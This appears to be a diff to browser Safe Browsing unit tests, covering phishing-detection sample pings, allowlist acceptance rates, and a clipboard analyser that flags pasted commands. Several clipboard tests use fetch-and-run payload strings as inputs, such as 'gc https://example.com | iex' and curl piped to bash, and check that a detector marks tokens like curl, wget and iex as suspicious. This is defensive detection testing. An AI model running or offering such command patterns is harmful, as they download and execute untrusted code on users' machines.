@@ -139,6 +139,7 @@ class TestClientSideDetectionHostBase : public ClientSideDetectionHostBase {
   using ClientSideDetectionHostBase::
       AddMiscellaneousMetadataToClientPhishingRequest;
   using ClientSideDetectionHostBase::CanGetAccessToken;
+  using ClientSideDetectionHostBase::CanSendSamplePing;
   using ClientSideDetectionHostBase::ExtractClipboardData;
   using ClientSideDetectionHostBase::GetTierValue;
   using ClientSideDetectionHostBase::HasDonePreclassificationCheckOnSameURL;
@@ -156,6 +157,7 @@ class TestClientSideDetectionHostBase : public ClientSideDetectionHostBase {
   using ClientSideDetectionHostBase::set_is_classifying;
   using ClientSideDetectionHostBase::set_is_csd_running;
   using ClientSideDetectionHostBase::set_last_request_type;
+  using ClientSideDetectionHostBase::ShouldAcceptHCAllowlist;
 
   ClientSideDetectionFeatureCacheBase feature_cache_;
   std::optional<ClientSideDetectionType> last_preclassification_request_type_;
@@ -735,6 +737,114 @@ TEST_F(ClientSideDetectionHostBaseTest, OnIntelligentScanDoneFailure) {
       "SBClientPhishing.IntelligentScanHasSuccessfulResponse", false, 1);
 }
 
+TEST_F(ClientSideDetectionHostBaseTest, CanSendSamplePing) {
+  // Enhanced protection disabled -> false regardless of request type or
+  // sample rate.
+  SetEnhancedProtectionPrefForTests(&prefs_, false);
+  host_->set_sample_ping_rate_for_testing(1.0f);
+  EXPECT_FALSE(
+      host_->CanSendSamplePing(ClientSideDetectionType::TRIGGER_MODELS));
+
+  // Enhanced protection enabled, TRIGGER_MODELS, and 1.0 sample ping rate ->
+  // true.
+  SetEnhancedProtectionPrefForTests(&prefs_, true);
+  host_->set_sample_ping_rate_for_testing(1.0f);
+  EXPECT_TRUE(
+      host_->CanSendSamplePing(ClientSideDetectionType::TRIGGER_MODELS));
+
+  // Enhanced protection enabled, TRIGGER_MODELS, but 0.0 sample ping rate ->
+  // false.
+  host_->set_sample_ping_rate_for_testing(0.0f);
+  EXPECT_FALSE(
+      host_->CanSendSamplePing(ClientSideDetectionType::TRIGGER_MODELS));
+
+  // Non-trigger-models request type -> false even with 1.0 sample ping rate and
+  // Enhanced protection enabled.
+  host_->set_sample_ping_rate_for_testing(1.0f);
+  EXPECT_FALSE(
+      host_->CanSendSamplePing(ClientSideDetectionType::CLIPBOARD_COPY_API));
+  EXPECT_FALSE(
+      host_->CanSendSamplePing(ClientSideDetectionType::FORCE_REQUEST));
+  EXPECT_FALSE(
+      host_->CanSendSamplePing(ClientSideDetectionType::CREDIT_CARD_FORM));
+  EXPECT_FALSE(host_->CanSendSamplePing(
+      ClientSideDetectionType::CLIENT_SIDE_DETECTION_TYPE_UNSPECIFIED));
+}
+
+TEST_F(ClientSideDetectionHostBaseTest, ShouldAcceptHCAllowlist_TriggerModels) {
+  // Not on allowlist -> false regardless of request type.
+  EXPECT_FALSE(host_->ShouldAcceptHCAllowlist(
+      ClientSideDetectionType::TRIGGER_MODELS,
+      /*url_on_high_confidence_allowlist=*/false));
+
+  // TRIGGER_MODELS with 1.0 acceptance rate -> true.
+  host_->set_high_confidence_allowlist_acceptance_rate_for_testing(1.0f);
+  EXPECT_TRUE(host_->ShouldAcceptHCAllowlist(
+      ClientSideDetectionType::TRIGGER_MODELS,
+      /*url_on_high_confidence_allowlist=*/true));
+
+  // TRIGGER_MODELS with 0.0 acceptance rate -> false.
+  host_->set_high_confidence_allowlist_acceptance_rate_for_testing(0.0f);
+  EXPECT_FALSE(host_->ShouldAcceptHCAllowlist(
+      ClientSideDetectionType::TRIGGER_MODELS,
+      /*url_on_high_confidence_allowlist=*/true));
+
+  // FORCE_REQUEST -> false.
+  EXPECT_FALSE(host_->ShouldAcceptHCAllowlist(
+      ClientSideDetectionType::FORCE_REQUEST,
+      /*url_on_high_confidence_allowlist=*/true));
+}
+
+TEST_F(ClientSideDetectionHostBaseTest,
+       ShouldAcceptHCAllowlist_ClipboardCopyApi) {
+  // CLIPBOARD_COPY_API with feature acceptance rate 1.0 -> true.
+  {
+    base::test::ScopedFeatureList feature_list;
+    feature_list.InitAndEnableFeatureWithParameters(
+        kClientSideDetectionClipboardCopyApi,
+        {{kCsdClipboardCopyApiHCAcceptanceRate.name, "1.0"}});
+    EXPECT_TRUE(host_->ShouldAcceptHCAllowlist(
+        ClientSideDetectionType::CLIPBOARD_COPY_API,
+        /*url_on_high_confidence_allowlist=*/true));
+  }
+
+  // CLIPBOARD_COPY_API with feature acceptance rate 0.0 -> false.
+  {
+    base::test::ScopedFeatureList feature_list;
+    feature_list.InitAndEnableFeatureWithParameters(
+        kClientSideDetectionClipboardCopyApi,
+        {{kCsdClipboardCopyApiHCAcceptanceRate.name, "0.0"}});
+    EXPECT_FALSE(host_->ShouldAcceptHCAllowlist(
+        ClientSideDetectionType::CLIPBOARD_COPY_API,
+        /*url_on_high_confidence_allowlist=*/true));
+  }
+}
+
+TEST_F(ClientSideDetectionHostBaseTest,
+       ShouldAcceptHCAllowlist_CreditCardForm) {
+  // CREDIT_CARD_FORM with feature acceptance rate 1.0 -> true.
+  {
+    base::test::ScopedFeatureList feature_list;
+    feature_list.InitAndEnableFeatureWithParameters(
+        kClientSideDetectionCreditCardForm,
+        {{kCsdCreditCardFormHCAcceptanceRate.name, "1.0"}});
+    EXPECT_TRUE(host_->ShouldAcceptHCAllowlist(
+        ClientSideDetectionType::CREDIT_CARD_FORM,
+        /*url_on_high_confidence_allowlist=*/true));
+  }
+
+  // CREDIT_CARD_FORM with feature acceptance rate 0.0 -> false.
+  {
+    base::test::ScopedFeatureList feature_list;
+    feature_list.InitAndEnableFeatureWithParameters(
+        kClientSideDetectionCreditCardForm,
+        {{kCsdCreditCardFormHCAcceptanceRate.name, "0.0"}});
+    EXPECT_FALSE(host_->ShouldAcceptHCAllowlist(
+        ClientSideDetectionType::CREDIT_CARD_FORM,
+        /*url_on_high_confidence_allowlist=*/true));
+  }
+}
+
 // Unit tests for ExtractClipboardData
 class ClientSideDetectionHostBaseClipboardDataTest
     : public ClientSideDetectionHostBaseTest {
@@ -833,12 +943,66 @@ TEST_F(ClientSideDetectionHostBaseClipboardDataTest, MixedCaseAndPaths) {
 
 TEST_F(ClientSideDetectionHostBaseClipboardDataTest, MixedDelimiters) {
   ClipboardExtractedData data = ExtractFromPayload(
-      u"curl\thttps://e.com\rwget\nhttp://b.com|{bash};(cmd::iex)");
+      u"\"curl\"\thttps://e.com\rwget\nhttp://b.com|{bash};(cmd::iex)");
   EXPECT_THAT(data.suspicious_tokens(),
               ::testing::ElementsAre("curl", "wget", "bash", "cmd", "iex"));
   EXPECT_TRUE(data.is_first_token_suspicious());
   EXPECT_TRUE(data.is_last_token_suspicious());
   EXPECT_TRUE(data.is_overall_suspicious());
+}
+
+TEST_F(ClientSideDetectionHostBaseClipboardDataTest, QuoteDelimiter) {
+  ClipboardExtractedData data =
+      ExtractFromPayload(u"\"curl\" \"https://example.com/s.sh\" \"bash\"");
+  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("curl", "bash"));
+  EXPECT_TRUE(data.is_first_token_suspicious());
+  EXPECT_TRUE(data.is_last_token_suspicious());
+  EXPECT_EQ(data.urls_size(), 1);
+  EXPECT_TRUE(data.is_overall_suspicious());
+}
+
+TEST_F(ClientSideDetectionHostBaseClipboardDataTest, GcLoader) {
+  ClipboardExtractedData data =
+      ExtractFromPayload(u"gc https://example.com | iex");
+  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("gc", "iex"));
+  EXPECT_TRUE(data.is_first_token_suspicious());
+  EXPECT_TRUE(data.is_last_token_suspicious());
+  EXPECT_EQ(data.urls_size(), 1);
+  EXPECT_TRUE(data.is_overall_suspicious());
+}
+
+TEST_F(ClientSideDetectionHostBaseClipboardDataTest, LocalAppDataEndpoint) {
+  ClipboardExtractedData data = ExtractFromPayload(u"gc %LOCALAPPDATA% | iex");
+  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("gc", "iex"));
+  EXPECT_TRUE(data.is_first_token_suspicious());
+  EXPECT_TRUE(data.is_last_token_suspicious());
+  EXPECT_THAT(data.urls(), ::testing::ElementsAre("%localappdata%"));
+  EXPECT_TRUE(data.is_overall_suspicious());
+
+  ClipboardExtractedData quoted_mixed_case =
+      ExtractFromPayload(u"gc \"%LocalAppData%\" | iex");
+  EXPECT_THAT(quoted_mixed_case.suspicious_tokens(),
+              ::testing::ElementsAre("gc", "iex"));
+  EXPECT_THAT(quoted_mixed_case.urls(),
+              ::testing::ElementsAre("%localappdata%"));
+  EXPECT_TRUE(quoted_mixed_case.is_overall_suspicious());
+}
+
+TEST_F(ClientSideDetectionHostBaseClipboardDataTest, UserProfileEndpoint) {
+  ClipboardExtractedData data = ExtractFromPayload(u"gc %USERPROFILE% | iex");
+  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("gc", "iex"));
+  EXPECT_TRUE(data.is_first_token_suspicious());
+  EXPECT_TRUE(data.is_last_token_suspicious());
+  EXPECT_THAT(data.urls(), ::testing::ElementsAre("%userprofile%"));
+  EXPECT_TRUE(data.is_overall_suspicious());
+
+  ClipboardExtractedData quoted_mixed_case =
+      ExtractFromPayload(u"gc \"%UserProfile%\" | iex");
+  EXPECT_THAT(quoted_mixed_case.suspicious_tokens(),
+              ::testing::ElementsAre("gc", "iex"));
+  EXPECT_THAT(quoted_mixed_case.urls(),
+              ::testing::ElementsAre("%userprofile%"));
+  EXPECT_TRUE(quoted_mixed_case.is_overall_suspicious());
 }
 
 TEST_F(ClientSideDetectionHostBaseClipboardDataTest, IncludeFullPayload) {
